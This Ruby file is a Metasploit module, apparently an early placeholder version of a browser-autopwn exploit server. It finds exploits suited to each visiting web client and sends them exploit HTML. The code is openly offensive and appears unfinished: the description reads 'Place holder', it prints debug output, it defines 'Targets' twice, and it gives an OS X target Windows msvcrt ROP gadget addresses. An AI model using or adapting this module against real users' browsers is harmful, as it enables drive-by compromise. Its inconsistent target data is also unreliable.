##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserAutopwnv2

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HTTP Client Automatic Exploiter",
      'Description'    => %q{
        Place holder
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'Targets'        => [ [ 'Automatic', {} ] ],
      'DefaultOptions' => {
        'DisablePayloadHandler' => true # BAPv2 will set up our own
      },
      'Platform'       => %w{ java linux osx solaris win android firefox },
      'Privileged'     => false,
      'DisclosureDate' => "Feb 5 2014",
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [
            'OSX Target',
            {
              :os_name => 'Mac OS X',
              'Rop'   => :msvcrt,
              'Pivot' => 0x77c15ed5, # xchg eax, esp; ret
              'Align' => 0x77c4d801  # add esp, 0x2c; ret
            }
          ]
        ],
      'DefaultTarget'  => 0))
  end

  def on_request_exploit(cli, request, target_info)
    $stderr.puts get_target.inspect
    $stderr.puts find_suitable_exploits(target_info)
    send_exploit_html(cli, 'OK')
  end


end
